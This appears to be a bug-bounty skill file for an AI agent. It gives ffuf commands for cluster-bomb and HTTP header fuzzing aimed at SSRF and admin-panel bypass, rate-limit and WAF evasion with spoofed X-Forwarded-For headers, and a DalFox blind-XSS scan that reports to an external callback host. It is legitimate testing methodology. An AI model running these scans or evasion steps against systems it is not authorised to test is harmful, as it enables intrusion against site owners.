---
name: bbp-advanced-fuzzing
description: Advanced fuzzing techniques using ffuf and DalFox. Use this for bypassing WAFs, cluster bomb fuzzing, header fuzzing, and complex HTTP parameter discovery.
---

# Advanced Fuzzing Methodology (ffuf & DalFox)

This guide covers advanced usage of `ffuf` beyond basic directory brute-forcing.

## 1. Multiple Fuzz Locations (Cluster Bomb)
Fuzz both a directory and a parameter at the same time:
```bash
ffuf -u https://target.com/W1?W2=test -w dirs.txt:W1 -w params.txt:W2 -mode clusterbomb
```

## 2. HTTP Header Fuzzing for SSRF/Bypass
Fuzz HTTP headers (e.g., `X-Forwarded-For`, `Host`, `Origin`) to find hidden admin panels or SSRF.
```bash
ffuf -u https://target.com/admin -w headers.txt -H "FUZZ: 127.0.0.1" -ac
```

## 3. Rate Limiting & WAF Evasion
If you get 429 Too Many Requests or 403 WAF blocks:
```bash
# Add a delay between requests (e.g., 2 seconds)
ffuf -u https://target.com/FUZZ -w wordlist.txt -p 2.0

# Add random delays (0.1 to 1.5 seconds)
ffuf -u https://target.com/FUZZ -w wordlist.txt -p 0.1-1.5

# Change User-Agent and use random IPs
ffuf -u https://target.com/FUZZ -w wordlist.txt -H "User-Agent: Mozilla/5.0..." -H "X-Forwarded-For: 127.0.0.1"
```

## 4. Advanced Filtering (Auto-Calibration)
When a site returns 200 OK for everything (catch-all), use Auto-Calibration:
```bash
ffuf -u https://target.com/FUZZ -w wordlist.txt -ac
```
Or manually filter by word count (`-fw`), line count (`-fl`), or regex (`-fr`).

## 5. DalFox for Blind XSS Fuzzing
Feed endpoints with parameters directly to DalFox for aggressive XSS scanning:
```bash
cat endpoints_with_params.txt | dalfox pipe -b https://your-xss-hunter-payload.com
```
